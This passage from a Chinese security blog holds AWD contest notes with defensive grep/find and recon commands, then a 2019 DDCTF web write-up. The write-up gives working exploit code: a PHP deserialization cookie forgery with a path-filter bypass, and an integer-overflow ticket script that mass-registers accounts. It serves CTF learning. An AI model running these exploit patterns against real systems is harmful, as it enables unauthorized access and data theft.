<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"copyright"</span>&gt;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    &lt;script <span class="keyword">async</span> src=<span class="string">"//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"</span>&gt;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    &lt;span class="post-meta-divider"&gt;|&lt;/</span>span&gt;</span><br><span class="line">    &lt;span id=<span class="string">"busuanzi_container_site_pv"</span>&gt;</span><br><span class="line">        本站总访问量: <span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span>次</span><br><span class="line">    &lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure>
<h3 id="set-specific-article-as-top">set specific article as top</h3>
<p>see the link below:</p>
<p><a href="https://www.jianshu.com/p/42a4efcdf8d7" target="_blank" rel="noopener">https://www.jianshu.com/p/42a4efcdf8d7</a></p>
<h2 id="图床问题">图床问题</h2>
<p>以前都是用github的图床, 现在直接放在本地了</p>
<p>我是在source下面新建了一个images文件夹, 然后在所有文章的开头都加上<code>typora-root-url: ../</code>, 同时在偏好里面设置图片存储位置为<code>../images</code> , 这样子<code>typora</code>在插入图片的时候就会把他放在/source/images下面了, 再也不用图床啦.</p>
<h2 id="rsync部署到自己的服务器上">rsync部署到自己的服务器上</h2>
<p>windows系统参考</p>
<p>https://rawbin-.github.io/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/%E5%BA%94%E7%94%A8%E6%8A%80%E6%9C%AF/2016/03/05/windows-ssh-chmod/</p>
<p><a href="https://www.wumingx.com/tools/hexo-deployer-rsync.html" target="_blank" rel="noopener">https://www.wumingx.com/tools/hexo-deployer-rsync.html</a></p>
<p>遇到403的时候, 就是rsync在windows上传输时候的权限问题, 写个定时任务可以解决</p>
]]></content>
      <categories>
        <category>闲来无事</category>
      </categories>
  </entry>
  <entry>
    <title>Awd笔记[working]</title>
    <url>/2019/08/19/Awd%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="登录">登录</h2>
<p>密钥连接:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa(这是私钥) username@url</span><br></pre></td></tr></table></figure>
<p>刚进去是home目录,不是/var/www/html !!!</p>
<h2 id="开局操作">开局操作</h2>
<p>修改ssh用户密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">登录之后使用passwd &#123;用户名&#125;</span><br></pre></td></tr></table></figure>
<p>数据库开局操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库备份</span><br><span class="line">mysqldump -u [username] –p[password] [database_name] &gt; [dump_file.sql]</span><br><span class="line">数据库本地恢复</span><br><span class="line">mysql -u [username] –p[password] [database_name] &lt; [dump_file.sql]</span><br><span class="line">数据库远程恢复</span><br><span class="line"> mysql –h [hostname] –u [username] –p[password] [database_name] &lt; [dump_file.sql]</span><br><span class="line">修改数据库用户密码</span><br><span class="line">set password for [username]@localhost=password(&apos;xxxxx&apos;);</span><br></pre></td></tr></table></figure>
<p>备份网站源代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">打包压缩</span><br><span class="line">tar -czf source.tar.gz souce_code_folder</span><br><span class="line">在当前目录下解压网站源代码</span><br><span class="line">tar -xzf source.tar.gz</span><br></pre></td></tr></table></figure>
<p>使用scp或者rsync来传输文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -r root@207.148.64.125:/home/ch4ser/blog/hexo/ ./</span><br><span class="line">scp root@207.148.64.125:/home/ch4ser/blog/hexo/_config.yml ./</span><br><span class="line">scp filename root@207.148.64.125:</span><br><span class="line">scp filename root@207.148.64.125:Document/</span><br><span class="line">scp -r folder root@207.148.64.125:Document/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> the method below is more functional</span><br><span class="line"><span class="meta">#</span> 'a' means digui-translation, 'v' means output the information generated during the transformation. 'z' means compare the transforming files with the local file so that no duplicate and useless effort will be done.</span><br><span class="line">rsync -avz root@207.148.64.125:/home/ch4ser/blog/hexo/ ./</span><br><span class="line">rsync -avz folder root@207.148.64.125:/Document</span><br></pre></td></tr></table></figure>
<h2 id="流量监控和关键字过滤waf-php">流量监控和关键字过滤waf.php</h2>
<p>Done</p>
<h2 id="回显flag自动替换">回显flag自动替换</h2>
<p>Done</p>
<h2 id="垃圾流量生成">垃圾流量生成</h2>
<p>Done</p>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- url</span><br><span class="line">nmap -A -p- url</span><br><span class="line">python3 dirsearch.py -u &#123;url&#125; -e php</span><br></pre></td></tr></table></figure>
<h2 id="防御侦察">防御侦察</h2>
<p>在文件夹中搜索某个关键字(eval, system, exec… ),找到一句话后门之后立即删除.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -r &quot;eval&quot; /var/www/html</span><br></pre></td></tr></table></figure>
<p>查找被修改的php文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查找24小时之内修改的文件</span><br><span class="line">find ./ -mtime -0 -name &quot;*.php&quot;</span><br><span class="line">查找10分钟内被修改的文件</span><br><span class="line">find ./ -mmin -10 -name &quot;*.php&quot;</span><br></pre></td></tr></table></figure>
<h2 id="flag读取">flag读取</h2>
<p>mysql 读取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&apos;/flag&apos;);</span><br></pre></td></tr></table></figure>
<h2 id="Phpstorm-搜索關鍵字-working">Phpstorm 搜索關鍵字(working)</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__destruct</span><br><span class="line">__get</span><br><span class="line">__call</span><br><span class="line">file_exists</span><br><span class="line">eval</span><br><span class="line">exec</span><br></pre></td></tr></table></figure>
<h1>赛后复现</h1>
<p>除了把网站的源代码拖进web目录下, 对于数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE USER &apos;ch4ser&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;some_pass&apos;;</span><br><span class="line">set password for &apos;ch4ser&apos;@&apos;localhost&apos;=password(&apos;toor&apos;);</span><br><span class="line">mysql -uch4ser -p -h localhost</span><br><span class="line">source xxxxx.sql</span><br><span class="line"></span><br><span class="line">如果有权限问题</span><br><span class="line">mysql -uroot -h localhost</span><br><span class="line">GRANT ALL PRIVILEGES ON xxxxxxx_db.* TO &apos;ch4ser&apos;@&apos;localhost&apos;;</span><br></pre></td></tr></table></figure>
<h1>pyweb 相关</h1>
<p>更改代码后要重启, 除非app.DEBUG = True, 常见于config.php</p>
<p>ps -ef查看flask怎么启动的再重新启动</p>
]]></content>
  </entry>
  <entry>
    <title>2019 DDCTF web </title>
    <url>/2019/05/11/2019-DDCTF-web/</url>
    <content><![CDATA[<h1>didictf web wp</h1>
<p>考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。</p>
<h2 id="web-签到题">web 签到题</h2>
<p>点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送<code>Auth.php</code>请求，其中有<code>didictf_username</code>字段，尝试添加成为<code>didictf_username: admin</code>。成功登陆。</p>
<p>然后在返回包中显示出了一个<code>php文件</code>，尝试访问看到了<code>Session.php</code>的源代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);<span class="comment">//去掉空格</span></span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);<span class="comment">//过滤第一</span></span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);<span class="comment">//过滤第二</span></span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;<span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);<span class="comment">// ....//config/flag.php</span></span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;<span class="comment">//../config/flag.php</span></span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration			= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure				= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;<span class="comment">//target1: 绕过所有false</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//cookie not empty</span></span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//ddctf_id 不能为空</span></span><br><span class="line"></span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);<span class="comment">//长度要大于32? 32位之后的内容</span></span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);<span class="comment">//一直截断到倒数第32位</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;<span class="comment">//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容</span></span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);<span class="comment">//ddctf_id 反序列化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path??</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;<span class="comment">//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//ip_address 要写自己的ip</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//user_agent 内容要和 http_user_agent的匹配</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="comment">//看起来可以动手脚的只有session_id?</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($</span><br><span class="line">    );</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到<code>key</code>之后构造ddctfid:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//nickname = %s</span></span><br><span class="line"></span><br><span class="line">$a = <span class="string">'a:4:&#123;s:10:"session_id";s:32:"3f65fc339c032f85048e42f21fab4ef0";s:10:"ip_address";s:14:"211.137.22.191";s:10:"user_agent";s:78:"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0";s:9:"user_data";s:0:"";&#125;'</span>;</span><br><span class="line"></span><br><span class="line">$b = unserialize($a);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $path = <span class="string">'....//config/flag.txt'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = <span class="string">'EzblrbNS'</span>;</span><br><span class="line">$b[<span class="string">'user_data'</span>] = <span class="keyword">new</span> Application;</span><br><span class="line"></span><br><span class="line">$d = serialize($b);</span><br><span class="line"><span class="keyword">echo</span> urlencode($d.md5($key.$d));</span><br></pre></td></tr></table></figure>
<p>传参即可。</p>
<h2 id="大吉大利今晚吃鸡">大吉大利今晚吃鸡</h2>
<p>遇到买东西的题目首先思路就是改变价格，通过抓包发现价格可以往大改而不能往小改。可以利用整数溢出<code>0xffffffff+1</code>，传参进去就买到了。<br>
然后要淘汰100个人，实际上要淘汰149个人。脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://117.51.147.155:5050'</span></span><br><span class="line">seq = [</span><br><span class="line">    <span class="string">'register'</span>,</span><br><span class="line">    <span class="string">'login'</span>,</span><br><span class="line">    <span class="string">'balance'</span>,</span><br><span class="line">    <span class="string">'search_ticket'</span>,</span><br><span class="line">    <span class="string">'bill'</span>,</span><br><span class="line">    <span class="string">'buy'</span>,</span><br><span class="line">    <span class="string">'bill'</span>,</span><br><span class="line">     <span class="string">'pay'</span>]</span><br><span class="line"></span><br><span class="line">url_seg = &#123;</span><br><span class="line">    <span class="string">'register'</span>:<span class="string">'/ctf/api/register?name=&#123;0&#125;&amp;password=11111111'</span>,</span><br><span class="line">    <span class="string">'login'</span>:<span class="string">'/ctf/api/login?name=&#123;0&#125;&amp;password=11111111'</span>,</span><br><span class="line">    <span class="string">'balance'</span>:<span class="string">'/ctf/api/get_user_balance'</span>,</span><br><span class="line">    <span class="string">'search_ticket'</span>:<span class="string">'/ctf/api/search_ticket'</span>,</span><br><span class="line">    <span class="string">'bill'</span>:<span class="string">'/ctf/api/search_bill_info'</span>,</span><br><span class="line">    <span class="string">'buy'</span>:<span class="string">'/ctf/api/buy_ticket?ticket_price=4294967296'</span>,</span><br><span class="line">    <span class="string">'remove'</span>:<span class="string">'/ctf/api/remove_robot?id=&#123;0&#125;&amp;ticket=&#123;1&#125;'</span>,</span><br><span class="line">    <span class="string">'pay'</span>:<span class="string">'/ctf/api/pay_ticket?bill_id=&#123;0&#125;'</span>&#125;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">victiom =&#123;</span><br><span class="line"> <span class="number">1</span>: <span class="string">'21cb23b38e33426812d68991dbb6ba68'</span>,</span><br><span class="line"> <span class="number">2</span>: <span class="string">'6f89be1e66c9bd69bce99952aa009a96'</span>,</span><br><span class="line"> <span class="number">3</span>: <span class="string">'70e1b0196609646efd0aacea613943d6'</span>,</span><br><span class="line"> <span class="number">4</span>: <span class="string">'46f7f7e50b54a636f3aae60dd839590b'</span>,</span><br><span class="line"> <span class="number">5</span>: <span class="string">'395b9fb4fb0f3cf42a727d43536be457'</span>,</span><br><span class="line"> ···</span><br><span class="line"> ···</span><br><span class="line"> <span class="number">147</span>: <span class="string">'4cc522f84f11189d9737ab18fc22fcd0'</span>,</span><br><span class="line"> <span class="number">148</span>: <span class="string">'8f2675372aa0f2ecfee1aeeee3d814cd'</span>,</span><br><span class="line"> <span class="number">149</span>: <span class="string">'7544b9ee45ae6ae7066305d472077638'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_login_get_ticket</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> victiom </span><br><span class="line">    <span class="keyword">global</span> session</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        username = random.sample(string.letters, <span class="number">19</span>)    </span><br><span class="line">        username1 = <span class="string">''</span>.join(username)</span><br><span class="line">        register1 = url_seg[<span class="string">'register'</span>].format(str(username1))</span><br><span class="line">        reg_url = url + register1</span><br><span class="line">        <span class="keyword">print</span> reg_url</span><br><span class="line">        res = session.get(reg_url).content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'\u7528\u6237\u6ce8\u518c\u6210\u529f'</span> <span class="keyword">in</span> res:</span><br><span class="line">            log_url = url + url_seg[<span class="string">'login'</span>].format(username1)</span><br><span class="line">            session.get(log_url)</span><br><span class="line">            buy_url = url + url_seg[<span class="string">'buy'</span>]</span><br><span class="line">            res = session.get(buy_url).content</span><br><span class="line">            bill_url = url + url_seg[<span class="string">'bill'</span>]</span><br><span class="line">            html = session.get(bill_url)</span><br><span class="line">            jsonn = json.loads(html.text)</span><br><span class="line">            bill_id = jsonn[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line">            pay_url = url + url_seg[<span class="string">'pay'</span>].format(bill_id)</span><br><span class="line">            session.get(pay_url)</span><br><span class="line">            sear_url = url + url_seg[<span class="string">'search_ticket'</span>]</span><br><span class="line">            html = session.get(sear_url)</span><br><span class="line">            res = html.content</span><br><span class="line">            josnn = json.loads(html.text)</span><br><span class="line">            id = josnn[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'id'</span>]</span><br><span class="line">            <span class="comment"># 这个地方有点奇怪，josn解析不出ticket所以采用正则匹配的方式</span></span><br><span class="line">            ticket = re.search(<span class="string">"ticket\":\"(.*?)\""</span>, res).group(<span class="number">1</span>)</span><br><span class="line">            victiom[id] = ticket</span><br><span class="line">            <span class="keyword">print</span> victiom</span><br><span class="line">            <span class="keyword">if</span> len(victiom) == <span class="number">149</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_other</span><span class="params">()</span>:</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    regiter1  = url_seg[<span class="string">'register'</span>].format(<span class="string">'ch5ser_cqw_cq'</span>)</span><br><span class="line">    reg_url = url + regiter1</span><br><span class="line">    res = session.get(reg_url).content</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'\u7528\u6237\u6ce8\u518c\u6210\u529f'</span> <span class="keyword">in</span> res:</span><br><span class="line">            log_url = url + url_seg[<span class="string">'login'</span>].format(<span class="string">'ch5ser_cqw_cq'</span>)</span><br><span class="line">            session.get(log_url)</span><br><span class="line">            buy_url = url + url_seg[<span class="string">'buy'</span>]</span><br><span class="line">            res = session.get(buy_url).content</span><br><span class="line">            bill_url = url + url_seg[<span class="string">'bill'</span>]</span><br><span class="line">            html = session.get(bill_url)</span><br><span class="line">            jsonn = json.loads(html.text)</span><br><span class="line">            bill_id = jsonn[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line">            pay_url = url + url_seg[<span class="string">'pay'</span>].format(bill_id)</span><br><span class="line">            session.get(pay_url)</span><br><span class="line">            sear_url = url + url_seg[<span class="string">'search_ticket'</span>]</span><br><span class="line">            html = session.get(sear_url)</span><br><span class="line">            <span class="keyword">for</span> key, value <span class="keyword">in</span> victiom.items():    </span><br><span class="line">                remove = url_seg[<span class="string">'remove'</span>].format(str(key), value)</span><br><span class="line">                rem_url = url + remove</span><br><span class="line">                <span class="keyword">print</span> session.get(rem_url).content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> session.get(<span class="string">"http://117.51.147.155:5050/ctf/api/get_flag"</span>).content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 注册过快可能会被封</span></span><br><span class="line">    register_login_get_ticket()</span><br><span class="line">    delete_other()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>学长的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">"http://117.51.147.155:5050/ctf/api/register?name=cic"</span>+str(i)+<span class="string">"&amp;password=12345678"</span></span><br><span class="line">        html = requests.get(url)</span><br><span class="line">        print(html.text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ticket</span><span class="params">(i)</span>:</span></span><br><span class="line"></span><br><span class="line">        s = requests.session()</span><br><span class="line">        s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=cic"</span>+str(i)+<span class="string">"&amp;password=12345678"</span>)</span><br><span class="line">        html = s.get(<span 